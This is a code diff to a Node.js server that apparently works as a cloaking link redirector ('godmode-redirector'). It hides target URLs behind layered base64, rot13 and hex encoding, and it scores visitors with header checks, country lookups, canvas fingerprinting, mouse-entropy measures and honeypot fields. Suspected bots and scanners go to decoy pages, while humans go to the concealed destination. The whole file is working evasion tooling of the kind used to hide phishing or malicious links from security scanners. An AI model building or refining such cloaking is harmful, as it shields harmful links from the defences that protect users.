@@ -3,8 +3,8 @@ const helmet = require('helmet');
 const fs = require('fs');
 const rateLimit = require('express-rate-limit');
 const crypto = require('crypto');
-const fetch = require('node-fetch'); // npm install node-fetch@2
-const NodeCache = require('node-cache'); // npm install node-cache
+const fetch = require('node-fetch');
+const NodeCache = require('node-cache');
 
 const app = express();
 
@@ -30,11 +30,10 @@ const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().sp
 const LOG_FILE = 'clicks.log';
 const PORT = process.env.PORT || 10000;
 
-// Cache country codes for 24h
 const geoCache = new NodeCache({ stdTTL: 86400, checkperiod: 600 });
 
 // ────────────────────────────────────────────────
-// CSP
+// MIDDLEWARE
 // ────────────────────────────────────────────────
 app.use((req, res, next) => {
   res.locals.nonce = crypto.randomBytes(16).toString('hex');
@@ -45,11 +44,11 @@ app.use(helmet({
   contentSecurityPolicy: {
     directives: {
       defaultSrc: ["'self'"],
-      scriptSrc:  ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
-      styleSrc:   ["'self'", "'unsafe-inline'"],
-      imgSrc:     ["'self'", 'data:'],
+      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", 'data:'],
       connectSrc: ["'self'"],
-      frameSrc:   ["'self'"],
+      frameSrc: ["'self'"],
     },
   },
 }));
@@ -57,15 +56,14 @@ app.use(helmet({
 app.use(express.json({ limit: '1mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// Health check
+// Health endpoints
 app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));
 
 // ────────────────────────────────────────────────
 // HELPERS
 // ────────────────────────────────────────────────
 function isMobile(req) {
-  const ua = (req.headers['user-agent'] || '').toLowerCase();
-  return /android|iphone|ipad|ipod|mobi/i.test(ua);
+  return /android|iphone|ipad|ipod|mobi/i.test((req.headers['user-agent'] || '').toLowerCase());
 }
 
 // ────────────────────────────────────────────────
@@ -106,46 +104,50 @@ function isLikelyBot(req) {
   if (!req.headers['accept-language'] || req.headers['accept-language'].length < 5) score += 20;
   if (Object.keys(req.headers).length < 12) score += 25;
 
-  const headerKeys = Object.keys(req.headers);
-  const sortedKeys = [...headerKeys].sort();
-  if (headerKeys.join() === sortedKeys.join()) score += 25;
+  const keys = Object.keys(req.headers);
+  if (keys.join() === [...keys].sort().join()) score += 25;
 
-  console.log(`[BOT-SCORE-SERVER] Mobile=${isMobile(req)} | Score=${score} | UA=${ua.substring(0,100)}...`);
+  console.log(`[BOT-SCORE] Mobile=${isMobile(req)} | Score=${score} | UA=${ua.substring(0,100)}...`);
 
-  return score >= 70; // tightened threshold
+  return score >= 70;
 }
 
 // ────────────────────────────────────────────────
-// GEO – CACHED + AUTHENTICATED
+// GEO LOOKUP – CACHED + AUTHENTICATED
 // ────────────────────────────────────────────────
 async function getCountryCode(req) {
   let ip = (req.headers['x-forwarded-for']?.split(',')[0]?.trim()) ||
            req.headers['x-real-ip'] ||
-           req.ip ||
-           'unknown';
+           req.ip || 'unknown';
 
-  if (ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('::1') ||
-      ip.startsWith('10.') || (ip.startsWith('172.') && ip.split('.')[1] >= 16 && ip.split('.')[1] <= 31) ||
-      ip.startsWith('192.168.')) {
+  if (ip === 'unknown' || ip.match(/^(127\.|::1$|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/)) {
     return 'XX';
   }
 
-  const cached = geoCache.get(ip);
-  if (cached) return cached;
+  let cached = geoCache.get(ip);
+  if (cached) {
+    console.log(`[GEO-CACHE] ${ip} → ${cached}`);
+    return cached;
+  }
 
   const token = process.env.IPINFO_TOKEN;
-  if (!token) return 'XX';
+  if (!token) {
+    console.warn('[GEO] No IPINFO_TOKEN set');
+    return 'XX';
+  }
 
   try {
-    const res = await fetch(`https://api.ipinfo.io/${ip}/country_code?token=${token}`, {
+    const res = await fetch(`https://api.ipinfo.io/${ip}/country?token=${token}`, {
       timeout: 4000,
-      headers: { 'User-Agent': 'track-godmode/1.0' }
+      headers: { 'User-Agent': 'godmode-redirector/1.0' }
     });
 
     if (res.ok) {
-      const cc = (await res.text()).trim().toUpperCase();
-      if (/^[A-Z]{2}$/.test(cc)) {
+      const data = await res.json();
+      const cc = data.country?.toUpperCase();
+      if (cc && /^[A-Z]{2}$/.test(cc)) {
         geoCache.set(ip, cc);
+        console.log(`[GEO] ${ip} → ${cc} (cached)`);
         return cc;
       }
     }
@@ -157,16 +159,28 @@ async function getCountryCode(req) {
 }
 
 // ────────────────────────────────────────────────
-// ENCODING LAYERS (unchanged)
+// ENCODERS (fixed rot13)
 // ────────────────────────────────────────────────
 const encoders = [
   { name: 'base64', enc: s => Buffer.from(s).toString('base64'), dec: s => Buffer.from(s, 'base64').toString() },
   { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
-  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c <= 'Z' ? 13 : -13))), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c <= 'Z' ? -13 : 13))) },
+  { name: 'rot13',
+    enc: s => s.replace(/[a-zA-Z]/g, c => {
+      const base = c <= 'Z' ? 65 : 97;
+      return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
+    }),
+    dec: s => s.replace(/[a-zA-Z]/g, c => {
+      const base = c <= 'Z' ? 65 : 97;
+      return String.fromCharCode(((c.charCodeAt(0) - base - 13 + 26) % 26) + base);
+    })
+  },
   { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
   { name: 'urlencode', enc: encodeURIComponent, dec: decodeURIComponent },
 ];
 
+// ────────────────────────────────────────────────
+// MULTI-LAYER ENCODE / DECODE
+// ────────────────────────────────────────────────
 function multiLayerEncode(str) {
   let result = str;
   const noise = crypto.randomBytes(8).toString('hex');
@@ -201,7 +215,7 @@ function multiLayerDecode(encoded, layers, noise) {
 }
 
 // ────────────────────────────────────────────────
-// /generate (unchanged)
+// /generate endpoint
 // ────────────────────────────────────────────────
 app.get('/generate', (req, res) => {
   const target = req.query.target || TARGET_URL;
@@ -232,7 +246,7 @@ app.get('/generate', (req, res) => {
 });
 
 // ────────────────────────────────────────────────
-// MAIN /r/* ROUTE – GOD MODE DETECTION
+// MAIN /r/* ROUTE – GOD MODE
 // ────────────────────────────────────────────────
 app.get('/r/*', strictLimiter, async (req, res) => {
   const ua = req.headers['user-agent'] || '';
@@ -245,13 +259,13 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;
 
   if (!geoAllowed || isLikelyBot(req)) {
-    fs.appendFile(LOG_FILE, `${new Date().toISOString()} BLOCK ${ip} ${country} ${ua}\n`, () => {});
+    fs.appendFile(LOG_FILE, `${new Date().toISOString()} BLOCK ${ip} ${country} UA:${ua}\n`, () => {});
     return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
   }
 
-  fs.appendFile(LOG_FILE, `${new Date().toISOString()} PASS ${ip} ${country} ${ua}\n`, () => {});
+  fs.appendFile(LOG_FILE, `${new Date().toISOString()} PASS ${ip} ${country} UA:${ua}\n`, () => {});
 
-  // Decode target
+  // Decode target safely
   let redirectTarget = TARGET_URL;
   try {
     const params = new URLSearchParams(req.url.split('?')[1] || '');
@@ -259,13 +273,24 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     const layersB64 = params.get('l') || '';
 
     if (enc && layersB64) {
-      const { layers, noise } = JSON.parse(Buffer.from(layersB64, 'base64url').toString());
-      let decoded = multiLayerDecode(enc, layers, noise);
+      let layersData;
+      try {
+        layersData = JSON.parse(Buffer.from(layersB64, 'base64url').toString());
+      } catch {
+        console.warn(`[DECODE-JSON-ERR] ${ip}`);
+        layersData = { layers: [], noise: '' };
+      }
+
+      let decoded = multiLayerDecode(enc, layersData.layers, layersData.noise);
       decoded = decoded.split('#')[0];
       if (!/^https?:\/\//i.test(decoded)) decoded = 'https://' + decoded;
-      if (['http:', 'https:'].includes(new URL(decoded).protocol)) {
-        redirectTarget = decoded;
-      }
+
+      try {
+        const urlObj = new URL(decoded);
+        if (['http:', 'https:'].includes(urlObj.protocol)) {
+          redirectTarget = decoded;
+        }
+      } catch {}
     }
   } catch (e) {
     console.error(`[DECODE-ERR] ${ip} → ${e.message}`);
@@ -273,8 +298,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
   const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");
 
-  // ─── GOD MODE VERIFICATION PAGE ───
-  const hpSuffix = crypto.randomBytes(4).toString('hex'); // randomize field names
+  const hpSuffix = crypto.randomBytes(4).toString('hex');
 
   res.send(`
 <!DOCTYPE html>
@@ -285,23 +309,22 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   <title>Verifying...</title>
   <style>
     body { margin:0; background:#000; color:#fff; font-family:sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; }
-    .visually-hidden { position:absolute; width:1px; height:1px; padding:0; margin:-1px; overflow:hidden; clip:rect(0,0,0,0); border:0; }
+    .visually-hidden { position:absolute !important; width:1px !important; height:1px !important; padding:0 !important; margin:-1px !important; overflow:hidden !important; clip:rect(0,0,0,0) !important; border:0 !important; }
   </style>
 </head>
 <body>
   <div>Verifying request •••</div>
 
-  <!-- Advanced honeypots -->
   <div class="visually-hidden">
-    <input type="text" name="website_url_${hpSuffix}" id="hpw_${hpSuffix}" autocomplete="off" tabindex="-1">
-    <input type="text" name="company_name_${hpSuffix}" id="hpc_${hpSuffix}" autocomplete="off" tabindex="-1">
-    <input type="text" name="email_confirm_${hpSuffix}" id="hpe_${hpSuffix}" autocomplete="off" tabindex="-1">
-    <input type="checkbox" name="human_check_${hpSuffix}" id="hpx_${hpSuffix}" tabindex="-1">
+    <input type="text" id="hpw_${hpSuffix}" autocomplete="off" tabindex="-1">
+    <input type="text" id="hpc_${hpSuffix}" autocomplete="off" tabindex="-1">
+    <input type="text" id="hpe_${hpSuffix}" autocomplete="off" tabindex="-1">
+    <input type="checkbox" id="hpx_${hpSuffix}" tabindex="-1">
   </div>
 
   <script nonce="${res.locals.nonce}">
     const TARGET = '${safeTarget}';
-    const BOT    = '${BOT_URLS[0]}';
+    const BOT = '${BOT_URLS[0]}';
 
     let moves = 0, entropy = 0, lastX = 0, lastY = 0, lastTime = Date.now();
     let focusLost = 0;
@@ -326,11 +349,8 @@ app.get('/r/*', strictLimiter, async (req, res) => {
       }
     }, {passive: true});
 
-    document.addEventListener('visibilitychange', () => {
-      if (document.hidden) focusLost++;
-    });
+    document.addEventListener('visibilitychange', () => { if (document.hidden) focusLost++; });
 
-    // Canvas fingerprint
     const c = document.createElement('canvas');
     const ctx = c.getContext('2d');
     ctx.textBaseline = 'top'; ctx.font = '14px Arial';
@@ -339,7 +359,6 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('Hello, world!',4,17);
     const fp = c.toDataURL();
 
-    // Honeypot check
     function isHoneypotFilled() {
       return document.getElementById('hpw_${hpSuffix}')?.value.trim() ||
              document.getElementById('hpc_${hpSuffix}')?.value.trim() ||
@@ -350,23 +369,22 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     setTimeout(() => {
       const mobile = /Mobi|Android/i.test(navigator.userAgent);
 
-      const suspicious = 
+      const suspicious =
         isHoneypotFilled() ||
         entropy < (mobile ? 4.5 : 16) ||
         moves < (mobile ? 2 : 5) ||
         fp.includes('iVBORw0KGgo') ||
         navigator.webdriver === true ||
         (window.outerWidth === 0 || window.outerHeight === 0) ||
-        navigator.languages?.length < 1 ||
+        (navigator.languages?.length ?? 0) < 1 ||
         navigator.maxTouchPoints === undefined ||
         focusLost > (mobile ? 6 : 3);
 
-      console.log(\`[GOD-CHECK] ent:\${entropy.toFixed(1)} mov:\${moves} hp:\${isHoneypotFilled()?'FILLED':'empty'} fpSusp:\${fp.includes('iVBORw0KGgo')?'yes':'no'} → \${suspicious?'BOT':'HUMAN'}\`);
+      console.log(\`[GOD-CHECK] ent:\${entropy.toFixed(1)} mov:\${moves} hp:\${isHoneypotFilled() ? 'FILLED' : 'empty'} fpSusp:\${fp.includes('iVBORw0KGgo') ? 'yes' : 'no'} → \${suspicious ? 'BOT' : 'HUMAN'}\`);
 
       location.href = suspicious ? BOT : TARGET;
-    }, 1200 + Math.random() * 1600); // 1.2–2.8s
+    }, 1200 + Math.random() * 1600);
 
-    // Fallback if JS blocked/disabled
     setTimeout(() => location.href = BOT, 5000);
   </script>
 </body>
